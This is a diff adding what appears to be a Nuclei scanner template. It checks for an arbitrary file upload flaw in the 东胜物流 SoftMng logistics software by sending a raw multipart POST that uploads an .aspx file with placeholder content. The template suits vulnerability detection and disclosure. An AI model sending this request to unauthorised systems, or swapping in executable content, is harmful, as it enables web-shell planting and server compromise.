@@ -1,0 +1,38 @@
+id: DongSheng-FileInputHandler-Upload
+
+info:
+  name: 东胜物流 SoftMng FileInputHandler Upload 任意文件上传
+  author: proud
+  severity: critical
+  description: description
+  tags: upload-file
+
+http:
+  - raw:
+      - |+
+        POST /SoftMng/FileInputHandler/Upload HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Length: 207
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="QAZWSX.aspx"
+        Content-Type: application/octet-stream
+
+        123456
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+      - type: status
+        status:
+          - 200
